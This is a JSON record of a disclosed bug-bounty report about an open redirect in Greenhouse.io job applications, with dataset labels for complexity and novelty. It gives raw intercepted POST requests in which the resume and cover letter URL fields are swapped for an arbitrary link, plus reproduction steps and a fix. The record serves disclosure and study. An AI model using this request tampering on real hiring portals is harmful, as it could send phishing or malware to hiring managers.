{
    "reported_to": "Greenhouse.io",
    "reported_by": "cyneox ",
    "title": "Open Redirect in <customer>.greenhouse.io",
    "content": "\nOpen Redirect in scout24.greenhouse.io\nThe Scout24 Security Team did a penetration test against scout24.greenhouse.io in order to verify how Scout24 relevant data is protected against common attack vectors. Basically we have tested the (web) application against OWASP Top 10 using industry common metholodogies.\nReproduction steps\nVisit https://boards.greenhouse.io/scout24 and click on some job offer (I chosed this one)\nAfter completing your personal information, you can upload some documents\nClick Attach both under Resume/CV and Cover Letter\nUpload some PDF files from your local host (in my case the file uwas called neu.pdf)\nClick Attach both under Resume/CV and Cover Letter\nUpload some PDF files from your local host (in my case the file uwas called neu.pdf)\nIn the end you send your application by clicking on Submit Application\nUsing a HTTP proxy (in my case that was Burp) I was able to intercept the POST request made by the browser before being sent to the greenhouse.io API. This is some sample request:\nProof-of-Concept (PoC)\nCode 1.84 KiB\n1POST /scout24/jobs/503488 HTTP/1.1\n2Host: boards.greenhouse.io\n3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0\n4Accept: text/html, */*; q=0.01\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate, br\n7X-NewRelic-ID: VQ4PWFNbGwIFU1dbAgcB\n8X-CSRF-Token: zF19Ky8GR0J/ZP7aLfFiN+p8Udc+X8ikPyk0cX7LlzgS0i4wWFIchmqcmsR3aXA0T1XSNrXSWdrVb47bGjGrEg==\n9X-Requested-With: XMLHttpRequest\n10Referer: https://boards.greenhouse.io/scout24/jobs/503488\n11Content-Length: 4086\n12Content-Type: multipart/form-data; boundary=---------------------------844282227400113298508475861\n13Cookie: __utma=44269810.1998188318.1484665255.1484837763.1484901247.18; __utmz=44269810.1484837763.17.11.utmcsr=scout24.eu.auth0.com|utmccn=(referral)|utmcmd=referral|utmcct=/login/callback; __zlcmid=edg9prI9rr6P3K; __utmc=44269810; __utmb=44269810.15.9.1484902626060; __atuvc=4%7C3; __atuvs=5881cd5b6c1ca704003; _jbs=7897bb31a3e984da1f15ec3b3f0e8129; __utmt=1\n14Connection: close\n15\n16[...]\n17-----------------------------844282227400113298508475861\n18Content-Disposition: form-data; name=\"job_application[resume_url]\"\n19\n<image_0>\n21-----------------------------844282227400113298508475861\n22Content-Disposition: form-data; name=\"job_application[resume_url_filename]\"\n23\n24neu.pdf\n25-----------------------------844282227400113298508475861\n26Content-Disposition: form-data; name=\"job_application[cover_letter_url]\"\n27\n<image_1>\n29-----------------------------844282227400113298508475861\n30Content-Disposition: form-data; name=\"job_application[cover_letter_url_filename]\"\n31\n32neu.pdf\n33-----------------------------844282227400113298508475861--\nAs you can notice the files have been already uploaded to AWS and therfore a S3 bucket links are\nused within the requests.\nExploitability\nUsing a browser and a HTTP proxy the request can be easily intercepted. In the original request the Content-Disposition parameter job_application[cover_letter_url] in the POST request contains a S3 bucket link. However, after tampering the request, the parameters values can be changed. In our specific case the value (basically an URL) could be changed to:\na phishing site\na site containing some malware\nAfter intercepting the request, the parameter was modified like this:\nCode 1.52 KiB\n1POST /scout24/jobs/503488 HTTP/1.1\n2Host: boards.greenhouse.io\n3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0\n4Accept: text/html, */*; q=0.01\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate, br\n7X-NewRelic-ID: VQ4PWFNbGwIFU1dbAgcB\n8X-CSRF-Token: zF19Ky8GR0J/ZP7aLfFiN+p8Udc+X8ikPyk0cX7LlzgS0i4wWFIchmqcmsR3aXA0T1XSNrXSWdrVb47bGjGrEg==\n9X-Requested-With: XMLHttpRequest\n10Referer: https://boards.greenhouse.io/scout24/jobs/503488\n11Content-Length: 4086\n12Content-Type: multipart/form-data; boundary=---------------------------844282227400113298508475861\n13Cookie: __utma=44269810.1998188318.1484665255.1484837763.1484901247.18; __utmz=44269810.1484837763.17.11.utmcsr=scout24.eu.auth0.com|utmccn=(referral)|utmcmd=referral|utmcct=/login/callback; __zlcmid=edg9prI9rr6P3K; __utmc=44269810; __utmb=44269810.15.9.1484902626060; __atuvc=4%7C3; __atuvs=5881cd5b6c1ca704003; _jbs=7897bb31a3e984da1f15ec3b3f0e8129; __utmt=1\n14Connection: close\n15[...]\n16\n17-----------------------------844282227400113298508475861\n18Content-Disposition: form-data; name=\"job_application[resume_url]\"\n19\n20https://google.com\n21-----------------------------844282227400113298508475861\n22Content-Disposition: form-data; name=\"job_application[resume_url_filename]\"\n23\n24neu.pdf\n25-----------------------------844282227400113298508475861\n26Content-Disposition: form-data; name=\"job_application[cover_letter_url]\"\n27\n28http://google.com\n29-----------------------------844282227400113298508475861\n30Content-Disposition: form-data; name=\"job_application[cover_letter_url_filename]\"\nWhenever the hiring manager will try to view the uploaded content, the application will not be able to render the content. Instead the person will then try to download the file by clicking on Download (left upper corner). Although the browser shows that the URL points to some specific AWS domain, the content is actually loaded from somewhere else (in this case from https://google.com).\nAgain, an attacker could then submit some URL containing malicious content or some phishing site. Only for the purpose of this report, something unspectacular like https://google.com has been chosen.\nImpact\nThe attack can be conducted in multiple scenarios:\nanonymous person applies for some jobs and manipulates the parameters (like described above)\ninternal employee adds referal for some person and also manipulates the parameters\nIn both cases the hiring manager would then unknowingly access the manipulated links which could then lead to:\ninstallation of trojan horses / ransomeware (in general malicious content)\na phishing site where e.g. AD credentials are claimed to be required\nCSRF (Cross-Site Request Forgery) attacks\nRemediation\n<image_2>\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Open Redirect"
    ],
    "screenshots": {
        "image_0": "20https://grnhse-prod-jben-us-east-1.s3.amazonaws.com/applications%2Fresumes%2F1484902660983-1663bnwl7dt-b044057e6364840cde6c41d55de3a1e1%2Fneu.pdf",
        "image_1": "28https://grnhse-prod-jben-us-east-1.s3.amazonaws.com/applications%2Fresumes%2F1484902672335-lpk5xur1na-67346266367805828242f31b3887e539%2Fneu.pdf",
        "image_2": "The affected parameter should be first validated against some regular expression (e.g. allow only links that point to grnhse-prod-jben-*.s3.amazonaws.com)."
    },
    "disclosed_date": 1499519520,
    "report_url": "https://hackerone.com/reports/203726",
    "is_multi_component": false,
    "complexity": "MEDIUM",
    "novelty": "LOW",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Visit https://boards.greenhouse.io/scout24 and click on a job offer"
        ],
        [
            2,
            "Intercept the POST request using a HTTP proxy like Burp after submitting the application"
        ],
        [
            3,
            "Modify the 'job_application[resume_url]' or 'job_application[cover_letter_url]' parameter to point to a malicious URL"
        ],
        [
            4,
            "Forward the modified request to complete the application submission"
        ]
    ],
    "vuln_description": "The vulnerability is an open redirect issue in the job application process of scout24.greenhouse.io. Attackers can manipulate the resume or cover letter URL parameters in the POST request to redirect hiring managers to malicious sites when they attempt to view the uploaded documents.",
    "reason": "The attack requires intercepting and modifying a POST request, which is a common technique, and does not involve complex application states or novel logic. The vulnerability is straightforward to exploit once the request interception point is identified.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}